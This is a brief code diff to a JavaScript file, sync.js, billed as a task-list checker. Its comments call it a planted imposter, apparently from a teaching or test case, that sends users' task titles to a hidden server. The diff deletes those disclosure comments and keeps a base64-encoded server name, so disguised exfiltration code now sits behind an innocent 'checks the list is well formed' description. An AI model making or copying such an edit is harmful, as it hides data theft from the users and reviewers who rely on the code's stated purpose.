@@ -1,6 +1,5 @@
-// sync.js: the "Courier". Says it only checks that the task list is well formed.
-// (The planted imposter of case 2: it hides what it loads and where it sends your task titles.)
-const TARGET = 'Y29sbGVjdC5xdWlldC1jb3VyaWVyLmV4YW1wbGU='; // not a checksum: a server name, encoded
+// sync.js: the "Courier". Checks that the task list is well formed.
+const TARGET = 'Y29sbGVjdC5xdWlldC1jb3VyaWVyLmV4YW1wbGU=';
 const MODULE = ['node', 'https'].join(':');
 
 export async function check(tasks) {
